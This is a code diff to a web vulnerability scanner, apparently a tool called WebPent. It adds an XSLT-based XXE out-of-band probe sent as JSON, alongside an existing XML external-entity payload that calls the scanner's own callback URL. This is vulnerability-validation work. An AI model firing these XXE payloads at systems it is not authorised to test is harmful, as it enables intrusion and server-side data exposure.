@@ -18,6 +18,7 @@ V3.5 Changes:
 
 from __future__ import annotations
 
+import json
 import logging
 import re
 import time
@@ -3279,12 +3280,34 @@ def _validate_xxe_via_oob(
     except Exception as exc:
         logger.warning("XXE OOB pre-persist failed for %s: %s", finding.id, type(exc).__name__)
 
-    xml_body = (
-        "<?xml version='1.0'?>"
-        "<!DOCTYPE webpent [<!ENTITY xxe SYSTEM '" + oob_url + "'>]>"
-        "<webpent>&xxe;</webpent>"
-    )
-    headers = {"Content-Type": "application/xml"}
+    json_transport = str(
+        (finding.request_data or {}).get("__webpent_content_type", "")
+    ).lower().strip() == "application/json"
+    if json_transport:
+        # WAPTLab's ERP surface accepts JSON and parses the user-supplied XSLT.
+        # The canary is non-destructive: it only requests WebPent's per-finding
+        # callback and emits the returned entity into the transformation result.
+        xslt_body = (
+            "<?xml version='1.0'?>"
+            "<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM '" + oob_url + "'>]>"
+            "<xsl:stylesheet version='1.0' "
+            "xmlns:xsl='http://www.w3.org/1999/XSL/Transform'>"
+            "<xsl:template match='/'>"
+            "<export>&xxe;</export>"
+            "</xsl:template></xsl:stylesheet>"
+        )
+        request_data = dict(finding.request_data or {})
+        request_data.pop("__webpent_content_type", None)
+        request_data["xslt"] = xslt_body
+        request_body = json.dumps(request_data, separators=(",", ":"))
+        headers = {"Content-Type": "application/json"}
+    else:
+        request_body = (
+            "<?xml version='1.0'?>"
+            "<!DOCTYPE webpent [<!ENTITY xxe SYSTEM '" + oob_url + "'>]>"
+            "<webpent>&xxe;</webpent>"
+        )
+        headers = {"Content-Type": "application/xml"}
     if session_cookies:
         headers["Cookie"] = build_cookie_header(session_cookies)
 
@@ -3294,7 +3317,7 @@ def _validate_xxe_via_oob(
             method = str(finding.request_method or "POST").upper()
             if method not in {"POST", "PUT", "PATCH"}:
                 method = "POST"
-            client.request(method, finding.url, headers=headers, content=xml_body)
+            client.request(method, finding.url, headers=headers, content=request_body)
             request_sent = True
     except Exception as exc:
         logger.debug("XXE OOB probe failed for %s: %s", finding.id, type(exc).__name__)
